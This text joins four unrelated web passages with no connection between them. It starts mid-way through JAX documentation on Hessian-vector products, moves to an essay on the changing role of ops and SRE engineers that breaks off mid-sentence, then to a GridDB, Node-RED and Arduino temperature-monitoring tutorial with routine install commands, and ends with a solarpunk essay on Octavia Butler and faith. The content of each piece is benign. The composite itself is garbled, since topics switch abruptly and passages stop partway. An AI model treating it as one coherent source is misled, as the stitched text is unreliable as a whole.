<p>where <span>\(g(x) = \partial f(x) \cdot v\)</span> is a new scalar-valued function that dots the gradient of <span>\(f\)</span> at <span>\(x\)</span> with the vector <span>\(v\)</span>. Notice that we’re only ever differentiating scalar-valued functions of vector-valued arguments, which is exactly where we know <code><span>grad</span></code> is efficient.</p>
<p>In JAX code, we can just write this:</p>
<div>

<div><div><pre><span></span><span>def</span> <span>hvp</span><span>(</span><span>f</span><span>,</span> <span>x</span><span>,</span> <span>v</span><span>):</span>
    <span>return</span> <span>grad</span><span>(</span><span>lambda</span> <span>x</span><span>:</span> <span>jnp</span><span>.</span><span>vdot</span><span>(</span><span>grad</span><span>(</span><span>f</span><span>)(</span><span>x</span><span>),</span> <span>v</span><span>))(</span><span>x</span><span>)</span>
</pre></div>
</div>
</div>
<p>This example shows that you can freely use lexical closure, and JAX will never get perturbed or confused.</p>
<p>We’ll check this implementation a few cells down, once we see how to compute dense Hessian matrices. We’ll also write an even better version that uses both forward-mode and reverse-mode.</p>

<p>These two functions compute the same values (up to machine numerics), but differ in their implementation: <code><span>jacfwd</span></code> uses forward-mode automatic differentiation, which is more efficient for “tall” Jacobian matrices, while <code><span>jacrev</span></code> uses reverse-mode, which is more efficient for “wide” Jacobian matrices. For matrices that are near-square, <code><span>jacfwd</span></code> probably has an edge over <code><span>jacrev</span></code>.</p>

			<p><span>Infrastructure, ops, devops, systems engineering, sysadmin, infraops, SRE, platform engineering. As long as I’ve been doing computers, these terms have been effectively synonymous. If I wanted to tell someone what my job was, I could throw out any one of them and expect to be understood.</span></p>
<p><span>Every tech company had a software engineering team that built software and an operations team that built infrastructure for running that software. At some point in the past decade they would have renamed this operations team to “devops” or “SRE”, but whatever the name, that was my team and those were my people.</span></p>
<p><span>But unless you’re an infrastructure company, infrastructure is not your mission. Which means that every second you devote to infrastructure work — and every engineer you devote to infrastructure problems — is a distraction from your core goals.&nbsp;</span></p>
<p><span>What’s more, it’s a distraction that builds on itself. The more time and energy you spend on infrastructure, the more your focus gets scattered, and the more you deprive yourself of the time and energy that ought to be devoted to the problems your business exists to solve.</span></p>
<p><span>This isn’t exactly new. Infrastructure and operations have always been a distraction from your core business problems. It used to be the case that every company had to grow internal expertise in hardware, datacenters, networking, operating systems, config management, and so on up the tech stack until reaching their core business problems. Infrastructure and ops have always been a distraction, but until recently, a necessary one. A means to an end.</span></p>
<p><span>So what’s changed? These days, you increasingly have a choice. Sure, you </span><i><span>can</span></i><span> build all that internal expertise, but every day more and more of it is being served up via API on a silver platter.</span></p>
<p><span>Does this mean that operations is no longer important, no longer necessary? Far from it. Operations and operability are more important than ever. Let’s take a look at what’s happening to the ops profession at a high level, the emerging challenges we face, and the impact this’ll all have on our careers.&nbsp;</span></p>
<h3><b>Changes afoot</b></h3>
<p><span>Beyond the broader move into to cloud services, here are some of the major shifts on our horizon.</span></p>
<h5><b>From monolith to microservices</b></h5>
<p><span>Much has been written about the operational demands of a microservices architecture. Now that functions calling other functions involves a network hop, operational concerns are an unavoidable part of debugging even the most trivial problems. Microservices change the game from “building code” to “building systems”, which pushes more and more code writing into the realm of operations.</span></p>
<h5><b>From monitoring to observability</b></h5>
<p><span>Metric-based tools like Prometheus and DataDog are infrastructure monitoring tools, and quite good ones at that. When you’re responsible for infrastructure, the questions you care about are of aggregates and trends, thresholds and capacity. Monitoring tools are the right tool for the job, because that’s how you understand whether your infrastructure is healthy, and what actions to take to make it or keep it healthy.</span><span><br>
</span><span><br>
</span><span>Observability tools*, on the other hand, are for the people writing and shipping code to users every day, and trying to inspect and understand behavior at the nexus of users, production, and code. Observability tools preserve the full context of the request. This allows you to slice and dice and tease out new correlations, as well as view events in a waterfall by time (“tracing”). Observability is how you connect the dots between software and real business impact, and between your engineers’ experience and your users’ experience. </span><span><br>
</span><span><br>
</span><i><span>*Caution: many monitoring tools are trying to rebrand themselves as observability tools without first building the necessary functionality. To tell the difference, </span></i><a href="https://www.honeycomb.io/blog/so-you-want-to-build-an-observability-tool/"><i><span>see here</span></i></a><i><span>.</span></i></p>
<h5><b>From magic autoinstrumentation to instrumenting with intent</b></h5>
<p><span>Instrumentation is just another form of commenting and documenting your code. There are tools that promise to do it automatically for you, but they aren’t great at capturing intent.. Auto-instrumentation can tell you loads of ancillary details, but they will </span><i><span>never</span></i><span> let you divine the business value intended by the engineer who built it. So suck it up and instrument your code.</span></p>
<h3><b>Ops is dead. Long live ops.</b></h3>
<p><span>Ops teams are going the way of the dodo bird, yet operability, resiliency, and reliability have never been more important. The role of operations engineers is changing fast, and the role is bifurcating along the question of infrastructure. In the future, people who would formerly have called themselves “operations engineers” (or devops engineers) will get to choose between a role that emphasizes </span><i><span>building infrastructure software as a service </span></i><span>and a role that uses their infrastructure expertise to help teams of engineers ship software more effectively and efficiently…generally by building as little infrastructure as possible.</span></p>
<p><span>If your heart truly beats for working on infrastructure problems, you’re in luck! — there are more of those than ever. Go join an infrastructure company. Try one of the many companies — AWS, Azure, all the many developer tooling companies — whose mission consists of building infrastructure software, of being the best in the world at infrastructure, and selling that expertise to other companies. There are roles for software engineers who enjoy building infrastructure solutions as a service, and there are even specialist ops roles for running and operating that infrastructure at scale, or administering those data services at scale.&nbsp;</span></p>
<p><span>Otherwise, embrace the fact that your job consists of </span><i><span>building systems to enable teams of engineers to ship software that creates core business value</span></i><span>, which means home brewing as little infrastructure as possible. And what’s left?</span></p>
<h5><b>Vendor engineering</b><span>&nbsp;</span></h5>
<p><span>Effectively outsourcing components of your infrastructure and weaving them together into a seamless whole involves a great deal of architectural skill and domain expertise. This skill set is both rare and incredibly undervalued, especially considering how pervasive the need for it is. Think about it. If you work at a large company, dealing with other internal teams should feel like dealing with vendors. And if you work at a small company, dealing with other vendors should feel like dealing with other teams.&nbsp;</span></p>
<p><span>Anyone who wants a long and vibrant career in SRE leadership would do well to invest some energy into areas like these:</span></p>
<ul>
<li><span>Learn to evaluate vendors and their products effectively. Ask piercing, probing questions to gauge compatibility and fit. Determine which areas of friction you can live with and which are dealbreakers.</span></li>
<li><span>Learn to calculate and quantify the cost of your and your team’s time and labor. Be ruthless about shedding as much labor as possible in order to focus on your core business.&nbsp;</span></li>
<li><span>Learn to manage the true cost of ownership, and to advocate and educate internally for the right solution, particularly by managing up to execs and finance folks.</span></li>
</ul>
<h5><b>Product engineering</b><span>&nbsp;</span></h5>
<p><span>One of the great tragedies of infrastructure is how thoroughly most of us managed to evade the past 20+ years of lessons in managing products and learning how to work with designers. It’s no wonder most infrastructure tools require endless laborious trainings and certifications. They simply weren’t built like modern products for humans.</span></p>
<ul>
<li><span>I recommend a crash course. Embed yourself within a B2B or B2C feature delivery team for a spell. Learn their rhythms, learn their language, soak up some of their instincts. You’ll need them to balance and blend your instincts for architectural correctness, scaling patterns, and firefighting.</span></li>
<li><span>You don’t have to become an expert in shipping features. But you should learn the elements of relationship-building the way a good product manager does. And you must learn enough about the product lifecycle that you can help debug and divert teams whose roadmaps are hopelessly intertwined and whose roadmaps are grinding to a halt.</span></li>
</ul>
<h5><b>Sociotechnical systems engineering</b><span>&nbsp;</span></h5>
<p><span>The irreducible core of the SRE/devops skill set increasingly revolves around crafting and curating efficient, effective sociotechnical feedback loops that enable and empower engineers to ship code — to move swiftly, with confidence. Your job is not to say “no” or throw up roadblocks, it’s to figure out how to help them get to yes.</span></p>
<ul>
<li><span>Start with embracing releases. Lean hard into the deploy pipeline. The safest diff is the smallest diff, and you should ship automatically and compulsively. Optimize tests, CI/CD, etc so that deploys happen automatically upon merge to main, so that a single mergeset gets deployed at a time, there are no human gates, and everything goes live automatically within a few minutes of a developer committing their code. This is your holy grail, and most teams are nowhere near there.</span></li>
<li><span>Design and optimize on-call rotations that load balance the effort fairly and sustainably, and won’t burn people out. Apply the appropriate amount of pressure on management to devote enough time to reliability and fixing things versus just shipping new features. Hook up the feedback loops so that the people who are getting alerted are the ones empowered and motivated to fix the problems that are paging them. Ideally, you should page the person who made the change, every time.</span></li>
<li><span>Foster a culture of ownership and accountability while promulgating blamelessness throughout the org. Welcome engineers into production, and help them navigate production waters happily and successfully.</span></li>
</ul>
<h5><b>Managing the portfolio of technical investments.</b></h5>
<ul>
<li><span>Operability is the longest term investment / primary source of technical debt, so no one is better positioned to help evaluate and amortize those risks than ops engineers. It is effectively free to write code, compared to the gargantuan resources it takes to run that code and tend to it over the years.</span></li>
<li><span>Get excellent at migrations. Leave no trailing, stale remnants of systems behind to support — those are a terrible drain on the team. Surface this energy drain to decision-makers instead of …</span></li></ul></div></div></div>

<h2><a name="raspsetup">Raspberry Pi Setup</a></h2>
<p>First, we’re going to start by getting our Raspberry PI up and running. We need to install Ubuntu and build and install the GridDB Server, NodeJS, GridDB NodeJS Client along with Node Red and the Nodes we’ll be using. </p>
<h3>Raspberry Pi OS</h3>
<p>GridDB needs to run on a 64-bit OS, so we’ll use Pi Imager to write a 64-bit Ubuntu 18.04 server image to our micro SD card. </p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/pi_imager.png" alt="" width="694" height="472" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/pi_imager.png 694w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/pi_imager-300x204.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/pi_imager-600x408.png 600w" sizes="(max-width: 694px) 100vw, 694px"></p>
<h3>GridDB on Raspberry Pi</h3>
<p>Now that you can log into the Pi, we can follow this <a href="https://griddb.net/en/blog/griddb-on-arm-time-series-database-for-your-raspberry-pi">blog post</a> on how to compile and run GridDB on an ARM64-based Raspberry Pi.</p>

<h3>NodeJS, NodeJS GridDB Client</h3>
<p>To build the Node.js client required for Node-RED, we need to install Node.js, its development headers, and node native abstractions for Node.js.</p>
<pre># sudo apt-get install nodejs nodejs-dev node-nan
</pre>
<p>Now we need to build dependencies for the Node.js GridDB client, PCRE and SWIG.</p>
<pre>$ export LD_LIBRARY_PATH=/usr/local/lib
$ wget https://sourceforge.net/projects/pcre/files/pcre/8.39/pcre-8.39.tar.gz
$ tar xvfz pcre-8.39.tar.gz
$ cd pcre-8.39
$ ./configure
$ make
$ make install

$ wget https://prdownloads.sourceforge.net/swig/swig-3.0.12.tar.gz
$ tar xvfz swig-3.0.12.tar.gz
$ cd swig-3.0.12
$ ./configure
$ make
$ make install
</pre>
<p>With the prerequisites built, we can clone and build the Node.js GridDB client.</p>
<pre>$ git clone https://github.com/griddb/nodejs_client.git
$ cd nodejs_client &amp;&amp; make
</pre>
<h3>Install Node Red</h3>
<p>Now we can install Node Red and the Nodes we’re going to use:</p>
<pre># npm install node-red
# mkdir ~/.node-red
# cd ~/.node-red 
# npm install node-red-contrib-modbus@3.6.1 node-red-dashboard
</pre>
<p>The GridDB Node Red Node isn’t available from npm yet, </p>
<pre># cd ~
# git clone https://github.com/griddbnet/node-red-contrib-griddb.git
# cd ~/.node-red
# npm install ~/node-red-contrib-griddb 
</pre>
<p>Now we add the GridDB Client to our NODE_PATH and start node red. </p>
<pre># export NODE_PATH=:/home/ubuntu/nodejs_client
# ~/node_modules/node-red/bin/node-red-pi
</pre>
<p>Now, you can visit the Node-Red web page at http://your_pi_ip:1880/. We’re going to add the Modbus server so the mduino application will start properly. </p>

<h2><a name="hwsetup">PLC Setup</a></h2>
<h3>Hardware Setup</h3>
<p>For the hardware setup, we’re going to mount the hardware to a DIN rail, wire the temperature sensor, setup the Arduino IDE, and deploy our Arduino sketch to the PLC. </p>
<p>We mounted the Raspberry Pi4 to a <a href="https://dinrplate.com/">DINRplate</a> for a clean installation on a DIN rail and are using a generic terminal block from <a href="https://www.amazon.com/Electronics-Salon-Position-Terminal-Distribution-Module/dp/B07R647PSW/ref=sr_1_1?dchild=1&amp;keywords=Electronics-Salon+Slim+DIN+Rail+Mount+16A%2F300V+4x3+Position+Screw+Terminal+Block+Distribution+Module.&amp;qid=1593616215&amp;sr=8-1">Amazon</a>. Having everything mounted on the DIN rail will keep it neat and tidy, something very beneficial if you have 100s of temperature sensors.</p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/08/Screen-Shot-2020-08-09-at-7.33.01-AM.png" alt="" width="617" height="287" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/08/Screen-Shot-2020-08-09-at-7.33.01-AM.png 617w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/08/Screen-Shot-2020-08-09-at-7.33.01-AM-300x140.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/08/Screen-Shot-2020-08-09-at-7.33.01-AM-600x279.png 600w" sizes="(max-width: 617px) 100vw, 617px"></p>
<p>The ground wire of the temperature sensor is connected to the M-DUINO’s ground pin. The 5 volt wire is also connected to the M-DUINO’s +5 VDC pin. The sensor wire is connected to Pin2 and a 4.7k Ohm resistor is placed between the +5 VDC bus and the sensor bus. Multiple DS18B20 sensors can be attached to the same M-DUINO pin if you have a large enough terminal block which is one advantage of using the DS18B20 over using an Analog sensor. </p>
<h3>Arduino Setup</h3>
<p>After installing and starting the <a href="https://www.arduino.cc/en/main/software">Arduino IDE</a> for your preferred OS (It can be on the Raspberry Pi but I prefer to connect it directly to my development workstation) install the Arduino Modbus and DallasTemperatrure  libraries into the Arduino IDE. </p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs2.png" alt="" width="930" height="525" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs2.png 930w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs2-300x169.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs2-768x434.png 768w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs2-150x85.png 150w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs2-600x339.png 600w" sizes="(max-width: 930px) 100vw, 930px"></p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs.png" alt="" width="930" height="525" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs.png 930w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs-300x169.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs-768x434.png 768w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs-150x85.png 150w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/ide_libs-600x339.png 600w" sizes="(max-width: 930px) 100vw, 930px"></p>
<p>For the Arduino setup, the required headers are included and our M-Duino’s mac and ip address are configured. We’re using PIN2 to receive the signal from our DS18B20 so we configure the OneWire library appropriately. </p>
<p>Then we configure the ModBus server address which will run on the Raspberry Pi. The actual startup routine simply starts ethernet and serial. </p>
<pre>#include &lt;SPI.h&gt;
#include &lt;Ethernet.h&gt;
#include &lt;ArduinoRS485.h&gt;
#include &lt;ArduinoModbus.h&gt;
#include &lt;OneWire.h&gt;
#include &lt;DallasTemperature.h&gt;

byte mac[] = { 0xBE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED };
byte ip[] = { 192, 168, 1, 100 };

#define ONE_WIRE_BUS 2
OneWire oneWire(ONE_WIRE_BUS);
DallasTemperature sensors(&amp;oneWire);

EthernetClient etherClient;
ModbusTCPClient modbusTCPClient(etherClient);

IPAddress server(192, 168, 1, 80); // Modbus server
void setup() {

  Ethernet.begin(mac, ip);
  Serial.begin(9600);

}
</pre>
<p>The Arduino’s loop function runs every second, ensuring we have a Modbus server connection, collecting the temperature, multiplying it by 100 so it will fit in a 16-bit integer Modbus register, and sending sending it. </p>
<pre>void loop() {
  
  if (!modbusTCPClient.connected()) {
    Serial.println("Attempting to connect to Modbus TCP server");

    if (!modbusTCPClient.begin(server, 10502)) {
      Serial.println("Modbus TCP Client failed to connect!");
    } else {
      Serial.println("Modbus TCP Client connected");
    }
  } else {
    
    sensors.requestTemperatures();
    float temp = sensors.getTempCByIndex(0);
    Serial.print("Temperature is: ");
    // convert the temperature to int and multiply by 100 to not loose precision
    unsigned int tempbin = (int)(temp*100); 
    Serial.println(tempbin);
    
    if (!modbusTCPClient.holdingRegisterWrite(0, 0x00, tempbin)) {
      Serial.print("Failed to write register! ");
      Serial.println(modbusTCPClient.lastError());
    }

    delay(1000);
  }
}
</pre>
<p>Now with our Arduino code complete we can compile, upload and verify it’s working.</p>

<h2><a name="flows">Create the Node Red Flows</a></h2>
<p>We’ve already added a Modbus Server node to our flow, now we will create two more sets of connected nodes. The first set reads from Modbus, transforms the data into the structure expected by the GridDB-Put node and then inserts into GridDB.</p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes.png" alt="" width="700" height="291" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes.png 700w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes-300x125.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes-600x249.png 600w" sizes="(max-width: 700px) 100vw, 700px"></p>
<p>First, the Modbus Read Node needs to be configured to connect to the Modbus server. </p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read.png" alt="" width="499" height="800" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read.png 499w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read-187x300.png 187w" sizes="(max-width: 499px) 100vw, 499px"></p>
<p>Then, it can be configured to read the registers we are writing the temperature value to. </p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read2.png" alt="" width="601" height="601" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read2.png 601w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read2-150x150.png 150w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read2-300x300.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read2-230x230.png 230w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read2-400x400.png 400w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/modbus_read2-600x600.png 600w" sizes="(max-width: 601px) 100vw, 601px"></p>
<p>We transform the data so it is suitable for input to the GridDB-Put Node. The temperature is divided by 100 as it’s multiplied by 100 to not loose precision and converted to an integer to fit into the Modbus register. </p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/put-transform.png" alt="" width="420" height="313" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/put-transform.png 420w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/put-transform-300x224.png 300w" sizes="(max-width: 420px) 100vw, 420px"></p>
<p>The GridDB Put Node is configured with the container to write its schema. </p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_put.png" alt="" width="499" height="499" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_put.png 499w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_put-150x150.png 150w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_put-300x300.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_put-230x230.png 230w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_put-400x400.png 400w" sizes="(max-width: 499px) 100vw, 499px"></p>
<p>The second set of connected nodes reads from GridDB and display the values using Dashboard Nodes.</p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes1.png" alt="" width="774" height="333" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes1.png 774w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes1-300x129.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes1-768x330.png 768w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/connected_nodes1-600x258.png 600w" sizes="(max-width: 774px) 100vw, 774px"></p>
<p>The latest data is fetched from the GridDB container being written to above:</p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_query.png" alt="" width="500" height="500" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_query.png 500w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_query-150x150.png 150w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_query-300x300.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_query-230x230.png 230w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/griddb_query-400x400.png 400w" sizes="(max-width: 500px) 100vw, 500px"></p>
<p>The data output by the Query Node needs to be transformed to be usable by the Gauge Dashboard element. The Gauge Node itself needs no actual configuration. </p>
<p><img src="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/gauge-1024x640.png" alt="" width="1024" height="640" srcset="https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/gauge-1024x640.png 1024w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/gauge-300x188.png 300w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/gauge-768x480.png 768w, https://griddb-pro.azureedge.net/en/wp-content/uploads/2020/07/gauge-600x375.png 600w" sizes="(max-width: 1024px) 100vw, 1024px"></p>
<p>Like above, the data needs to be transformed to be usable by the Chart. The Chart node itself needs no actual configuration. </p>

  <p><span>Octavia Butler, the Black science fiction author to whom all others were compared until the coming of N.K. Jemisin, published the novel </span><i><span>Parable of the Sower</span></i><span> in 1993,</span> <span>first of a trilogy. In her fictional near-future, Southern California will become but one of the newly red-lined regions earmarked for a corner pocket of Hell, because the end is nigh. I’m talking, dolphins Snapchatting us, “WE OUT! NO-THANKS-FOR-THE-MERCURY-MARINATED-FISH!”-type of climatic environmental and societal collapse. No kaiju necessary. We will die of consumption after a fifty-plus year bender, drunk on neoliberal, late-stage capitalist moonshine.</span></p>
<p><em><span>[[This article appears in <a href="http://thenewmodality.com/letter-from-the-editor-newmo-issue-one/">Issue One</a> of </span></em><span>The New Modality.</span><em><span><a href="https://thenewmodality.backerkit.com/hosted_preorders"> Buy your copy or subscribe here</a>.]]</span></em></p>
<p><span>Fast forward to our present non-fiction. My day job is teaching elementary school. Yet despite the allure of two months of do-whatever-I-want-time, more and more I dread the coming of summer, because glaciers the size of islands are falling into the ocean. Is this the season when my <em>Westworld</em> kingdom is invaded by drought and famine? When Russia’s permafrost melts, releasing primeval microscopic disease-titans (</span><a href="http://www.bbc.com/earth/story/20170504-there-are-diseases-hidden-in-ice-and-they-are-waking-up"><span>they are real, 2017</span></a><span>) to gobble me up in a surprise Greek tragedy? When the floodgates of my Amazon-fueled desires are permanently clogged by natural man-made disaster? Of course, Prime will continue to deliver, but the markup would be understandably obscene.</span></p>
<p><span>Will this be the season my melanin hard-fails me?</span></p>
<p><span>I joke because I’m afraid. Not only is this specific dystopia possible, Butler seems to have predicted it twenty-seven years ago. </span><i><span>Parable of the Sower</span></i><span> is set somewhere in the 2020s during a presidential election in which the candidate’s campaign slogan is “Make America Great Again</span><i><span>.” </span></i><span>Oh yes, and California actually </span><i><span>is</span></i> <span>burning right now. This is a horrible present. I ordered the exact opposite of this nightmare. I asked for solarpunk.</span></p>
<p><b>Solarpunk: The Genre of Solutions</b></p>
<p><span>Solarpunk is the environmentally conscious speculative arts movement that best navigates the terrors ahead. Detractors label it a kind of Pollyanna utopianism full of empty calories. It’s true that the Google replicator machine will serve up a visual feast</span><span> of enforested skyscrapers and lush solar energy mushroom cities (possibly under the sea, possibly shared with amiable, buck-toothed invertebrates with ageless comedic timing). The solarpunk aesthetic will sometimes wear utopian clothing, but it’s nobody’s fault, really. Ursula K. Le Guin helped plant solarpunk seeds decades ago, in stories such as the 1972 novel </span><i><span>The Dispossessed,</span></i> <span>her 1982 essay “</span><a href="https://www.fifthestate.org/archive/382-spring-2010/non-euclidean-view-california-cold-place-1982/"><span>A Non-Euclidean View of California as a Cold Place to Be</span></a><span>,”</span> <span>and many othe</span><span>r Daoist-inspired works</span><i><span>.</span></i><span> Thus, the movement was growing long before the term was coined in 2008. So after decades of imagineering and community building, there are bound to be layers and crumbly edges. And to be fair, it is impossible to dream of Hell and not pine for its opposite.</span></p>
<p><span>In truth, solarpunk is functional AF. The primary colors of its aura are red, orange, and yellow: Courageously compassionate, creatively scientific, and awakened interdependence. In many ways, it can be more rigorous than so-called “hard science fiction.” Don’t @ the messenger; I’m quoting Kim Stanley Robinson, author of </span><i><span>New York 2140</span></i><span> among many other groundbreaking stories of eco-fiction. He takes issue with the viral over-affixation of “-punk” (Google punk genres and see how many you get). However, at Boskone 57, one of the largest science fiction conventions in the country, where he was guest of honor, Robinson described a genre full of futures to defy the Anthropocene. Stories where sacrifices are made, but in the end, we find ways to survive and become wise. I told him afterwards that it sounded like solarpunk, and he stage-whispered, “That’s because it is.”&nbsp;</span></p>
<p><span>If we focus primarily on the genre’s textual artifacts — including the discourses on the various social media platforms, but especially the genre fiction it produces — solarpunk’s better qualities become unimpeachable. I have read all the major solarpunk anthologies that have come out in the last five years. To quote Sarena Ulibarri, editor of </span><i><span>Glass and Gardens: Solarpunk Summers</span></i><span> and newly out </span><i><span>Solarpunk Winters,</span></i><span> because she’s so damn quotable, “[Solarpunk] stories depict adaptation and compromise rather than destruction and conquest… empathy over greed.” They are an antidote for the toxin, yin to counteract the damage done by the big yang motorcycle trip, and I am a believer.</span></p>
<p><span>Yet after reading and enjoying these stories, I noticed a pattern. The viewpoint characters of solarpunk stories roughly fall into categories with similar confluences; Joênia from Thomas Badlan’s “Orchidae” (in </span><i><span>Glass and Gardens: Solarpunk Winters,</span></i> <span>2020) is one among many intrepid scientists you will find in the genre, racing the clock to preserve life or help us adapt. Young makers, like Del the biotech tinkerer in D.K. Mok’s “The Spider and the Stars,” and the community that comes together to ceremonially re-create the vanished Arctic in Andrew Dana Hudson’s “Black Ice City” (both in </span><i><span>Solarpunk Summers,</span></i><span> 2018), are also well represented in solarpunk.&nbsp;&nbsp;</span></p>
<p><span>There’s some spillover from the makers into the anarchists. In T.X. Waston’s “The Boston Hearth Project” (in </span><i><span>Sunvault</span></i><i><span>,</span></i><span> a 2017 anthology edited by Wagner and Wieland), these are people who thrive on the leftmost bleeding edge of society, breaking rules that should never have been in order to shelter the homeless. But many solarpunk characters — and most salient to this conversation — are young people, often women of color, adjusting to the dangers of the new normal brought on by severe environmental changes and doing so in ways their elders did not have the foresight or perspective to do themselves. Daesha in “Fyrewall” by Stefani Cox </span><i><span>(Solarpunk Summers)</span></i><span> is one like this, gifted with responsibilities beyond her years when she must fix the wall protecting future Californians from raging wildfires. All these stories showcase new or repurposed material resources and technologies for increased sustainability.&nbsp;&nbsp;</span></p>
<p><span>Clearly these voices are necessary. But there’s something missing. The intersection with communities of faith is roped off.</span></p>
<p><b>Spirit in the Machine: The Missing Piece</b></p>
<p><span>The heroine of Butler’s </span><i><span>Parable of the Sower</span></i> <span>is</span> <span>Lauren Oya Olamina. She will be little more than a child before inevitable mayhem and metastasized, commodified suffering rolls up on her family, murders everyone, and destroys what is left of her community. She will escape with her life, but orphaned and traumatized. What is she to do?</span></p>
<p><span>Step one: Become a self-made messiah.</span></p>
<p><span>Step two: Reengineer God.</span></p>
<p><span>Step three: Save humanity.</span></p>
<p><span><span>Step four: Bong hits.</span></span></p>
<p><span>Hers is an incredibly powerful story. She very much fits the mold of solarpunk heroines with one exception: She’s a faith leader. Why aren’t there more characters like her? Where are the griots and santeras? Where are the bodhisattvas and the saints? Those who speak the languages of heaven’s heart? Where are the Lauren Oya Olaminas?</span></p>
<p><span>Her absence, given what she might represent, is understandable. Ideology (the dogmatic kind) has often been the death of free thinkers and first adopters. It has produced conservative paradigms that sustained brutal hierarchies, birthed unforgettable monsters, and poured bleach on other people’s history. But too often to ignore, the opposite has also been the case. Tibetan Buddhism and the Dalai Lama comes to mind. The Southern Christian Leadership Conference, the nonviolent Civil Rights Era organizing group whose goal was to redeem “the soul of America,” was not an aberration of history. Martin Luther King may have been a GOAT (Greatest Of All Time, for those without access to Urban Dictionary), but if time’s memory was more robust, his would not be the only spirit we commune with on special occasions.&nbsp;</span></p>
<p><span>So, whether it has been a purposeful or subconscious omission, this issue must be addressed for solarpunk to move beyond artists, and progressive secularists. We need to mainstream the radical.</span></p>
<p><b>The Intersection is Under Construction</b></p>
<p><span>There are three tenets of solarpunk orthodoxy that are relevant here. The first is that solarpunk is an overtly inclusive space. If it could be a real boy, anti-racism would be in its DNA. Keep that in mind when I tell you that the US Census <a href="https://www.brookings.edu/blog/the-avenue/2018/03/14/the-us-will-become-minority-white-in-2045-census-projects/%20">projects</a> that by the year 2045, the majority of US population will be people of color (already the case for residents under age eighteen) and the majority of us profess some kind of faith (itinerant Seon Buddhist right here).<br></span></p>
<p><span>In 2008, when last Pew Research asked the question, 95% of those surveyed reported belief in a higher power of some kind. Even among scientists, the believers were in the majority. Both numbers go up if you include the rest of the world, particularly the black and brown parts. So, for solarpunk to be properly inclusive of us in possible futures, it would be a mistake to blackbox significant guiding tenets because of an aversion to the dominant ideologies and the much-discussed potential for evil in organized religion. Evil is everywhere. Search for kittens on your favorite browser and scroll down for about thirty seconds. There be evil.&nbsp;</span></p>

